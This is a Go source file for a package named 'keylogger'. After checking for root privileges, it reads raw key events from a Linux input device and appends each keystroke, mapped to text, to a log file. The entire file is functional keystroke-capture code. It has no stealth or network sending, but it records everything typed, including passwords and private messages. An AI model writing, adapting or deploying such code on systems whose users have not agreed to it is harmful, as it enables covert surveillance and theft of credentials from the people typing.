package keylogger

import (
	"bytes"
	"encoding/binary"
	"io"
	"os"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/pkg/errors"
)

const (
	keyChannelSize   = 512
	errorChannelSize = 8

	evKey = 0x01
)

// RecorderOptions stores configuration options of the KeyRecorder.
type RecorderOptions struct {
	ShutdownCh <-chan struct{}
	Logger     Logger

	EventPath string
	LogPath   string
}

// InputEvent represents an input device event. Input code can be mapped to strings using KeyMapper.
type InputEvent struct {
	Time  syscall.Timeval
	Type  uint16
	Code  uint16
	Value int32
}

// ProcessingError wraps runtime error with processing status.
type ProcessingError struct {
	Error error
	Done  bool
}

// KeyRecorder is responsible for recoding key hits.
type KeyRecorder struct{}

// Record method observes incoming events, maps them to key hits and stores in the log file.
func (kr *KeyRecorder) Record(options *RecorderOptions) error {
	// Ensure root permissions
	root := new(Root)
	err := root.Ensure()
	if err != nil {
		return errors.Wrap(err, "insufficient permissions")
	}

	return kr.doRecording(options)
}

func (kr *KeyRecorder) doRecording(options *RecorderOptions) error {
	// Open event device
	eventDevice, err := os.Open(options.EventPath)
	if err != nil {
		return errors.Wrap(err, "can't open event device")
	}

	// Open log path
	logFile, err := os.OpenFile(options.LogPath, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	if err != nil {
		return errors.Wrap(err, "can't open or create log file")
	}
	defer logFile.Close()

	// Prepare communication channels
	keyCh := make(chan InputEvent, keyChannelSize)
	stopCh := make(chan struct{})
	errorCh := make(chan ProcessingError, errorChannelSize)

	// Spawn new routines
	var wg sync.WaitGroup
	wg.Add(2)
	go kr.logKeyEvents(&wg, logFile, keyCh, stopCh, errorCh)
	go kr.watchEventDevice(&wg, eventDevice, keyCh, errorCh)

	// Watch for shutdown events
	var stopCondition bool
	for !stopCondition {
		select {
		case <-options.ShutdownCh:
			eventDevice.Close()
			stopCondition = true
		case childErr := <-errorCh:
			if !childErr.Done {
				options.Logger.Error(childErr.Error.Error())
				continue
			}

			if errors.Cause(childErr.Error) == io.EOF {
				// Wait for reading all data from closed device
				// because select-case in non-deterministic.
				time.Sleep(1 * time.Second)
			}
			stopCondition = true
			err = childErr.Error
		}
	}
	stopCh <- struct{}{}
	wg.Wait()
	return err
}

func (kr *KeyRecorder) logKeyEvents(wg *sync.WaitGroup, logFile *os.File, keyCh chan InputEvent, stopCh <-chan struct{}, errorCh chan<- ProcessingError) {
	var keyMapper KeyMapper

	var stopCondition bool
	var err error
	for !stopCondition {
		select {
		case k := <-keyCh:
			_, err = logFile.WriteString(keyMapper.Map(k.Code))
			if err != nil {
				errorCh <- ProcessingError{Error: errors.Wrap(err, "can't write mapped code"), Done: true}
				stopCondition = true
			}
		case <-stopCh:
			stopCondition = true
		}
	}
	wg.Done()
}

func (kr *KeyRecorder) watchEventDevice(wg *sync.WaitGroup, eventDevice *os.File, keyCh chan<- InputEvent, errorCh chan<- ProcessingError) {
	var inputEvent InputEvent
	inputEventBuffer := make([]byte, unsafe.Sizeof(inputEvent))

	var n int
	var err error
	for {
		n, err = eventDevice.Read(inputEventBuffer)
		if err != nil {
			errorCh <- ProcessingError{Error: errors.Wrap(err, "can't read from event device"), Done: true}
			wg.Done()
			return
		} else if n == 0 {
			continue
		}

		err = binary.Read(bytes.NewReader(inputEventBuffer), binary.LittleEndian, &inputEvent)
		if err != nil {
			errorCh <- ProcessingError{Error: errors.Wrap(err, "can't deserialize input event")}
			continue
		}

		if kr.shouldBeLogged(inputEvent) {
			keyCh <- inputEvent
		}
	}
}

func (kr *KeyRecorder) shouldBeLogged(event InputEvent) bool {
	return event.Type == evKey && event.Value > 0
}
